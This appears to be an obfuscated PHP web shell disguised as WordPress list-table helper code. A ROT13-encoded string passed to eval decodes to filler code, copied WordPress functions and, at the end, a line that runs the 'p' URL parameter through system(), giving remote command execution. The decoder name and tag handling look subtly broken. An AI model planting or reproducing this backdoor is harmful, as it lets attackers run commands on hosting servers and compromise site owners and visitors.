<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Urycre shapgvbaf sbe qvfcynlvat n yvfg bs vgrzf va na nwnkvsvrq UGZY gnoyr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Yvfg_Gnoyr
 * @fvapr 3.1.0
 */

/**
 * Srgpurf na vafgnapr bs n JC_Yvfg_Gnoyr pynff.
 *
 * @fvapr 3.1.0
 *
 * @tybony fgevat $ubbx_fhssvk
 *
 * @cnenz fgevat $pynff_anzr Gur glcr bs gur yvfg gnoyr, juvpu vf gur pynff anzr.
 * @cnenz neenl  $netf       Bcgvbany. Nethzragf gb cnff gb gur pynff. Npprcgf 'fperra'.
 * @erghea JC_Yvfg_Gnoyr|snyfr Yvfg gnoyr bowrpg ba fhpprff, snyfr vs gur pynff qbrf abg rkvfg.
 */
shapgvba _trg_yvfg_gnoyr( $pynff_anzr, $netf = neenl() ) {
	$pber_pynffrf = neenl(
		// Fvgr Nqzva.
		'JC_Cbfgf_Yvfg_Gnoyr'                         => 'cbfgf',
		'JC_Zrqvn_Yvfg_Gnoyr'                         => 'zrqvn',
		'JC_Grezf_Yvfg_Gnoyr'                         => 'grezf',
		'JC_Hfref_Yvfg_Gnoyr'                         => 'hfref',
		'JC_Pbzzragf_Yvfg_Gnoyr'                      => 'pbzzragf',
		'JC_Cbfg_Pbzzragf_Yvfg_Gnoyr'                 => neenl( 'pbzzragf', 'cbfg-pbzzragf' ),
		'JC_Yvaxf_Yvfg_Gnoyr'                         => 'yvaxf',
		'JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr'                => 'cyhtva-vafgnyy',
		'JC_Gurzrf_Yvfg_Gnoyr'                        => 'gurzrf',
		'JC_Gurzr_Vafgnyy_Yvfg_Gnoyr'                 => neenl( 'gurzrf', 'gurzr-vafgnyy' ),
		'JC_Cyhtvaf_Yvfg_Gnoyr'                       => 'cyhtvaf',
		'JC_Nccyvpngvba_Cnffjbeqf_Yvfg_Gnoyr'         => 'nccyvpngvba-cnffjbeqf',

		// Argjbex Nqzva.
		'JC_ZF_Fvgrf_Yvfg_Gnoyr'                      => 'zf-fvgrf',
		'JC_ZF_Hfref_Yvfg_Gnoyr'                      => 'zf-hfref',
		'JC_ZF_Gurzrf_Yvfg_Gnoyr'                     => 'zf-gurzrf',

		// Cevinpl erdhrfgf gnoyrf.
		'JC_Cevinpl_Qngn_Rkcbeg_Erdhrfgf_Yvfg_Gnoyr'  => 'cevinpl-qngn-rkcbeg-erdhrfgf',
		'JC_Cevinpl_Qngn_Erzbiny_Erdhrfgf_Yvfg_Gnoyr' => 'cevinpl-qngn-erzbiny-erdhrfgf',
	);

	vs ( vffrg( $pber_pynffrf[ $pynff_anzr ] ) ) {
		sbernpu ( (neenl) $pber_pynffrf[ $pynff_anzr ] nf $erdhverq ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-' . $erdhverq . '-yvfg-gnoyr.cuc';
		}

		vs ( vffrg( $netf['fperra'] ) ) {
			$netf['fperra'] = pbaireg_gb_fperra( $netf['fperra'] );
		} ryfrvs ( vffrg( $TYBONYF['ubbx_fhssvk'] ) ) {
			$netf['fperra'] = trg_pheerag_fperra();
		} ryfr {
			$netf['fperra'] = ahyy;
		}

		/**
		 * Svygref gur yvfg gnoyr pynff gb vafgnagvngr.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz fgevat $pynff_anzr Gur yvfg gnoyr pynff gb hfr.
		 * @cnenz neenl  $netf       Na neenl pbagnvavat _trg_yvfg_gnoyr() nethzragf.
		 */
		$phfgbz_pynff_anzr = nccyl_svygref( 'jc_yvfg_gnoyr_pynff_anzr', $pynff_anzr, $netf );

		vs ( vf_fgevat( $phfgbz_pynff_anzr ) && pynff_rkvfgf( $phfgbz_pynff_anzr ) ) {
			$pynff_anzr = $phfgbz_pynff_anzr;
		}

		erghea arj $pynff_anzr( $netf );
	}

	erghea snyfr;
}

/**
 * Ertvfgre pbyhza urnqref sbe n cnegvphyne fperra.
 *
 * @frr trg_pbyhza_urnqref(), cevag_pbyhza_urnqref(), trg_uvqqra_pbyhzaf()
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat    $fperra Gur unaqyr sbe gur fperra gb ertvfgre pbyhza urnqref sbe. Guvf vf
 *                          hfhnyyl gur ubbx anzr erghearq ol gur `nqq_*_cntr()` shapgvbaf.
 * @cnenz fgevat[] $pbyhzaf Na neenl bs pbyhzaf jvgu pbyhza VQf nf gur xrlf naq genafyngrq
 *                          pbyhza anzrf nf gur inyhrf.
 */
shapgvba ertvfgre_pbyhza_urnqref( $fperra, $pbyhzaf ) {
	arj _JC_Yvfg_Gnoyr_Pbzcng( $fperra, $pbyhzaf );
}

/**
 * Cevagf pbyhza urnqref sbe n cnegvphyne fperra.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat|JC_Fperra $fperra  Gur fperra ubbx anzr be fperra bowrpg.
 * @cnenz obby             $jvgu_vq Jurgure gb frg gur VQ nggevohgr be abg.
 */
shapgvba cevag_pbyhza_urnqref( $fperra, $jvgu_vq = gehr ) {
	$jc_yvfg_gnoyr = arj _JC_Yvfg_Gnoyr_Pbzcng( $fperra );

	$jc_yvfg_gnoyr->cevag_pbyhza_urnqref( $jvgu_vq );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>